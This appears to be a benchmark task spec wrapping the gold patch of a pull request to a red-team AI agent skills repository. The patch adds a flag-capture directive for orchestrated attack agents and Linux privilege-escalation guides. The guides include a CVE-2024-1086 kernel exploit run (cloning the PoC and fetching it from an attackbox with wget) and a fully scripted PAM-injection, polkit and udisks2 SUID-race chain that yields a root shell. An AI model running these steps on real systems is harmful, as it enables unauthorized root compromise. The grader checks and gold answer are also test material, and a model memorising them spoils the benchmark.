@@ -1,0 +1,80 @@
+version: "2.0"
+
+task:
+  name: red-run-add-privesc-chains-kernel-cve
+  kind: markdown_authoring
+  difficulty: easy
+
+source:
+  repo: blacklanternsecurity/red-run
+  pr: 82
+  base_commit: "8a2a1cbbcd51e61f8d56b43f22c3c2c034d616ad"
+  merge_commit: "3fe3cdb854dfbd295f66c85ec8698a407c3486dc"
+
+checks:
+  - id: signal_00
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/orchestrator/SKILL.md."
+  - id: signal_01
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/orchestrator/SKILL.md."
+  - id: signal_02
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/orchestrator/SKILL.md."
+  - id: signal_03
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/privesc/linux-discovery/SKILL.md."
+  - id: signal_04
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/privesc/linux-discovery/SKILL.md."
+  - id: signal_05
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/privesc/linux-discovery/SKILL.md."
+  - id: signal_06
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/privesc/linux-kernel-exploits/SKILL.md."
+  - id: signal_07
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/privesc/linux-kernel-exploits/SKILL.md."
+  - id: signal_08
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/privesc/linux-kernel-exploits/SKILL.md."
+  - id: signal_09
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/privesc/linux-sudo-suid-capabilities/SKILL.md."
+  - id: signal_10
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/privesc/linux-sudo-suid-capabilities/SKILL.md."
+  - id: signal_11
+    type: fail_to_pass
+    origin: pr_diff
+    description: "Distinctive line from gold patch must appear in skills/privesc/linux-sudo-suid-capabilities/SKILL.md."
+
+config_edits:
+  - path: skills/orchestrator/SKILL.md
+    tier: 1
+    gold_added: "| vuln w/ \"FLAG:\" in summary | Always — immediate | Notify operator with prominent callout (see Flag Capture section). Do not interrupt running agent. |\n### Flag Capture (CTF Speed Priority)\n\n**First blood wins.** When spawning any agent that has shell access on a\ntarget — discovery, privesc, or technique — append the **flag capture\ndirective** to the agent prompt. This is an orchestrator-injected instruction,\nnot part of any skill or agent definition.\n\n**When to append the directive:**\n- Every host discovery spawn (linux-discovery, windows-discovery)\n- Every privesc technique spawn (sudo/SUID, token impersonation, kernel, etc.)\n- Every post-exploitation spawn that runs commands on a host\n- Any agent that gains NEW access as part of its skill (e.g., file-upload-bypass\n  produces a web shell, kerberos-delegation produces a DA ticket + shell)\n\n**Do NOT append for:** network-recon, web-discovery, ad-discovery, password-\nspraying, credential-cracking, evasion — these don't have shell access on a\ntarget host.\n\n**The directive** (append verbatim to the agent prompt, substituting variables):\n\n```\nFLAG CAPTURE (do this FIRST, before enumeration):\nCheck for flags immediately upon gaining or using shell access. Read these\npaths and report any content found:\n- Linux: /root/root.txt, /root/proof.txt, /home/*/user.txt, /home/*/local.txt\n- Windows: C:\\Users\\Administrator\\Desktop\\root.txt, C:\\Users\\*\\Desktop\\user.txt, C:\\Users\\*\\Desktop\\proof.txt\nIf a path is not readable with current privileges, skip it silently.\nFor each flag found, IMMEDIATELY call add_vuln with:\n  target=<TARGET_HOST>, title=\"FLAG: <filename> (<username>)\",\n  vuln_type=\"flag\", severity=\"critical\",\n  details=\"<flag contents>\", discovered_by=\"<your agent name>\"\nThen continue with your skill methodology — do not stop or wait.\n```\n\n**Orchestrator handling when a flag event arrives:**\n\nWhen the event watcher or `poll_events()` surfaces a vuln event where the\nsummary contains \"FLAG:\", immediately notify the operator with a prominent\ncallout:\n\n```\n**FLAG CAPTURED on <host>**\n  File: <filename>\n  User: <privilege level>\n  Flag: <contents>\n  Agent: <which agent found it>\n```\n\nLog to `engagement/activity.md`:\n```\n### [YYYY-MM-DD HH:MM:SS] FLAG CAPTURED on <host>\n- File: <filename>, User: <privilege level>\n- Flag: <contents>\n- Found by: <agent name> during <skill name>\n```\n\nDo not interrupt the running agent — it continues enumeration normally. The\nflag is already in state via the agent's interim write.\n\n**Lateral movement and privesc re-check:** After every privilege escalation\n(user → root/SYSTEM/admin), the next agent spawn includes the directive again.\nHigher privileges unlock flag paths that were unreadable before (e.g.,\n`/root/root.txt` after privesc).\n"
+    gold_removed: ''
+  - path: skills/privesc/linux-discovery/SKILL.md
+    tier: 1
+    gold_added: "**PAM Environment Injection + Polkit Active Session Bypass:**\n\nOn SUSE/openSUSE (and potentially other distros), `pam_env.so` may be configured\nwith `user_readenv=1`, allowing users to inject environment variables via\n`~/.pam_environment` that are read *before* `pam_systemd.so` registers the\nsession with logind. This enables hijacking session properties to gain\n`Active=yes` status on an SSH session — unlocking all polkit `allow_active`\npolicies without authentication.\n\n```bash\n# Check PAM config for user_readenv=1\ngrep -r \"user_readenv\" /etc/pam.d/ 2>/dev/null\n\n# Check current session properties\nloginctl show-session \"$XDG_SESSION_ID\" 2>/dev/null | grep -E \"Active|State|Seat|Type\"\n\n# Enumerate polkit actions with allow_active=yes\npkaction --verbose 2>/dev/null | grep -B5 \"allow_active.*yes\" | grep -E \"^org\\.|allow_active\"\n```\n\n**What to look for:**\n\n| Finding | Meaning | Route To |\n|---------|---------|----------|\n| `user_readenv=1` in PAM config | Can inject XDG_SEAT/XDG_VTNR via ~/.pam_environment | **linux-sudo-suid-capabilities** |\n| `Active=no` + `user_readenv=1` | SSH session can be upgraded to Active=yes | **linux-sudo-suid-capabilities** |\n| `allow_active=yes` on udisks2, systemd, or other dangerous actions | Active session can perform privileged operations without auth | **linux-sudo-suid-capabilities** |\n\nIf `user_readenv=1` is found AND polkit actions with `allow_active=yes` exist\n→ STOP. Return to orchestrator recommending **linux-sudo-suid-capabilities**.\nPass: hostname, current user, PAM config showing user_readenv, loginctl session\noutput, list of allow_active polkit actions (especially udisks2 loop-setup,\nfilesystem resize/check). Do not execute exploitation commands inline.\n\n(polkit < 0.117 + accountsservice + dbus-send), PAM `user_readenv=1` with\npolkit `allow_active=yes` on dangerous actions (udisks2 loop-setup/resize,\nsystemd reboot/poweroff)\n  capabilities / polkit version and pkexec SUID status / PAM user_readenv +\n  polkit allow_active actions), kernel version."
+    gold_removed: ''
+  - path: skills/privesc/linux-kernel-exploits/SKILL.md
+    tier: 1
+    gold_added: "  - CVE-2024-1086\n  - nf_tables use-after-free\n| CVE-2023-32233 | Netfilter nf_tables UAF | 5.x – 6.3.1 | Medium |\n| CVE-2024-1086 | Netfilter nf_tables UAF (v2) | 5.14 – 6.6 | Medium |\n### CVE-2024-1086 — Netfilter nf_tables Use-After-Free (v2)\n\n**Affected:** Linux 5.14 through 6.6 (nf_tables module must be loaded)\n\nThis is a newer nf_tables UAF, distinct from CVE-2023-32233. It exploits a\ndouble-free in `nft_verdict_init()` via user namespaces. More reliable than\nCVE-2023-32233 on newer kernels but requires user namespace support.\n\n**Check vulnerability:**\n\n```bash\nuname -r\n# Must be 5.14.x through 6.6.x\n\n# nf_tables module loaded\nlsmod | grep nf_tables\n\n# User namespaces enabled (required)\ncat /proc/sys/kernel/unprivileged_userns_clone 2>/dev/null\n# Or: sysctl kernel.unprivileged_userns_clone\n\n# Seccomp status (exploit may fail under seccomp)\ngrep Seccomp /proc/self/status\n# Seccomp: 0 = no filter (good), 2 = filter active (may block)\n```\n\n**Exploit:**\n\n```bash\n# On attackbox: clone and compile\ngit clone https://github.com/Notselwyn/CVE-2024-1086\ncd CVE-2024-1086\nmake\n# Binary: exploit\n\n# Transfer to target\n# python3 -m http.server 8080\n# On target: wget http://ATTACKBOX:8080/exploit -O /tmp/exploit_1086\nchmod +x /tmp/exploit_1086\n/tmp/exploit_1086\n```\n\n**Alternative PoC repositories** (if the primary fails):\n- `https://github.com/Notselwyn/CVE-2024-1086` — original researcher's PoC\n- `https://github.com/CCob/CVE-2024-1086` — alternative implementation\n\n**Troubleshooting:**\n\n| Symptom | Cause | Fix |\n|---------|-------|-----|\n| \"failed to detect overwritten pte\" | PTE spray didn't land | Race condition — retry 3-5 times. Try alternative PoC repos with different spray strategies |\n| \"pmd: 00000000cafebabe\" | Sentinel value, spray completely missed | Kernel config may differ from what exploit expects. Try alternative PoC |\n| Seccomp blocks syscalls | Shell has seccomp filter (common in PHP-FPM, Docker) | Run from a non-seccomp context (SSH session, not webshell) |\n| \"Operation not permitted\" on CLONE_NEWUSER | User namespaces disabled | Check `kernel.unprivileged_userns_clone`. If 0, this exploit won't work |\n| Exploit hangs | Race condition timing | Run with `timeout 120 /tmp/exploit_1086`. Kill and retry |\n| Kernel panic/oops | UAF corruption | Inherent risk with UAF exploits. Warn client. May need box reboot |\n\n**Key insight:** This exploit is a race condition. A single failure does NOT mean\nthe kernel is patched. Retry 3-5 times before concluding it's blocked. If all\nretries fail with the same PTE error, try an alternative PoC repository — different\nimplementations use different spray strategies.\n"
+    gold_removed: ''
+  - path: skills/privesc/linux-sudo-suid-capabilities/SKILL.md
+    tier: 1
+    gold_added: "  - pam_environment\n  - user_readenv\n  - polkit allow_active\n  - udisksctl\n  - udisks2 privesc\n  - logind active session\n  - loop-setup nosuid\n## Step 4b: PAM Environment Injection + Polkit Active Session Bypass\n\nWhen `linux-discovery` reports `user_readenv=1` in PAM config and polkit\n`allow_active=yes` on privileged actions, this chain escalates an SSH session to\nperform operations that normally require physical console presence.\n\n### How It Works\n\n1. `pam_env.so` with `user_readenv=1` reads `~/.pam_environment` during the auth\n   stack — *before* `pam_systemd.so` runs in the session stack\n2. Injecting `XDG_SEAT` and `XDG_VTNR` tricks `pam_systemd` into registering the\n   SSH session as a physical console session (`Active=yes`)\n3. Polkit policies with `allow_active=yes` now grant access without authentication\n4. `udisksctl loop-setup` + `Filesystem.Resize`/`Check` triggers a temporary mount\n   via libblockdev at `/tmp/blockdev.XXXXXX` **without nosuid flags**\n5. A SUID root binary in the mounted filesystem executes with `euid=0`\n\n### Prerequisites\n\n- SSH access as any user\n- `pam_env.so` configured with `user_readenv=1` (default on SUSE/openSUSE)\n- `udisks2` + `libblockdev` installed (default on most desktop-oriented installs)\n- Polkit `allow_active=yes` on udisks2 loop-setup and filesystem operations\n- `xfsprogs` on attackbox (for building the XFS image)\n\n### Step 1: Verify PAM Configuration\n\n```bash\ngrep -r \"user_readenv\" /etc/pam.d/ 2>/dev/null\n# Look for: pam_env.so user_readenv=1\n```\n\nIf `user_readenv=1` is NOT present, this technique does not apply.\n\n### Step 2: Inject Session Properties\n\n```bash\ncat > ~/.pam_environment << 'EOF'\nXDG_SEAT OVERRIDE=seat0\nXDG_VTNR OVERRIDE=1\nEOF\n```\n\n**Disconnect the SSH session** (exit), then **reconnect**. The new session will be\nregistered as Active.\n\n### Step 3: Verify Active Session\n\n```bash\nloginctl show-session \"$XDG_SESSION_ID\" | grep -E \"Active|State|Seat\"\n# Expected: Active=yes, State=active, Seat=seat0\n```\n\nIf `Active=no`, check that `~/.pam_environment` was written correctly and that\nyou fully disconnected and reconnected (not just opened a new channel on the\nsame SSH connection).\n\n### Step 4: Build Malicious Filesystem Image (on attackbox)\n\nBuild an XFS image containing a SUID root bash binary. This requires root on the\nattackbox.\n\n```bash\n# Get bash from target for glibc compatibility\nscp user@TARGET:/bin/bash /tmp/target-bash\n\n# Create XFS image\ndd if=/dev/zero of=./suid.image bs=1M count=300\nmkfs.xfs -f ./suid.image\nmkdir -p /tmp/suid-mount\nmount -t xfs ./suid.image /tmp/suid-mount\ncp /tmp/target-bash /tmp/suid-mount/bash\nchown root:root /tmp/suid-mount/bash\nchmod 04555 /tmp/suid-mount/bash\numount /tmp/suid-mount\n\n# Transfer to target\nscp ./suid.image user@TARGET:~/suid.image\n```\n\n### Step 5: Exploit UDisks2 Nosuid Mount Race\n\nOn target (with `Active=yes` session):\n\n```bash\n# Kill gvfs-udisks2-volume-monitor if running (can interfere)\nkillall -KILL gvfs-udisks2-volume-monitor 2>/dev/null || true\n\n# Create loop device (no auth prompt thanks to Active=yes)\nudisksctl loop-setup --file ~/suid.image --no-user-interaction\n# Note the device path (e.g., /dev/loop0)\n\n# Start background catcher — races to exec SUID bash from temp mount\n(while true; do\n  for d in /tmp/blockdev*/; do\n    [ -x \"${d}bash\" ] && exec \"${d}bash\" -p -c 'echo \"[+] GOT ROOT\"; id; exec bash -p'\n  done\n  sleep 0.01\ndone) &\nCATCHER_PID=$!\n\n# Trigger nosuid-less temporary mount via XFS resize\ngdbus call --system \\\n  --dest org.freedesktop.UDisks2 \\\n  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \\\n  --method org.freedesktop.UDisks2.Filesystem.Resize 0 'a{sv}'\n\n# If Resize errors, try Check instead:\ngdbus call --system \\\n  --dest org.freedesktop.UDisks2 \\\n  --object-path /org/freedesktop/UDisks2/block_devices/loop0 \\\n  --method org.freedesktop.UDisks2.Filesystem.Check 'a{sv}'\n\n# Wait and check\nsleep 2\nls -la /tmp/blockdev*/bash 2>/dev/null\n\n# Execute SUID bash directly if catcher didn't fire\n/tmp/blockdev*/bash -p\n# Expected: euid=0(root)\n```\n\n**The `-p` flag is critical** — without it, bash drops the elevated euid.\n\n### Troubleshooting\n\n- **\"Not authorized\" from udisksctl**: `Active=yes` didn't take effect. Verify\n  with `loginctl show-session`. Ensure you fully disconnected and reconnected SSH.\n- **Race doesn't land**: The mount window is milliseconds. Retry 3-5 times. Kill\n  the catcher (`kill $CATCHER_PID`), delete the loop device (`udisksctl\n  loop-delete --block-device /dev/loop0 --no-user-interaction`), and repeat from\n  loop-setup.\n- **Loop device is loop1/loop2**: Adjust the gdbus object path to match (e.g.,\n  `/org/freedesktop/UDisks2/block_devices/loop1`).\n- **No /tmp/blockdev* appears**: libblockdev may use a different temp path. Check\n  `/proc/mounts` while triggering Resize/Check. A compiled C catcher monitoring\n  `/proc/mounts` in a tight loop is more reliable than the bash approach.\n- **udisksctl not found**: udisks2 not installed. This technique does not apply.\n\n### Cleanup\n\n```bash\nrm ~/.pam_environment\nkill $CATCHER_PID 2>/dev/null\nudisksctl loop-delete --block-device /dev/loop0 --no-user-interaction 2>/dev/null\nrm ~/suid.image\n```\n"
+    gold_removed: ''
